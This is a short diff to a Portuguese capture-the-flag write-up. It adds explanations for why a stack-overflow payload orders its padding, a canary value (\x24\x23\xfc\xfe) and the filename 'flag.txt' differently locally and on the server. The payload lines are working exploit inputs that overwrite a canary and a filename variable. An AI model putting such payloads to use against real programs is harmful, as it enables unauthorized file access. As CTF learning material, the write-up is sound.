@@ -9,6 +9,8 @@ Para conseguir a flag, mudamos a linha 14 do ficheiro "exploit-example.py" para 
 
 Localmente:
 `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag.txt\0\x24\x23\xfc\xfe`
+porque o canário("val") está declarado antes de "meme_file" e de "buffer".
 
 No servidor:
 `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x24\x23\xfc\xfeflag.txt\0`
+porque o canário("val") deve estar declarado entre "meme_file" e "buffer".
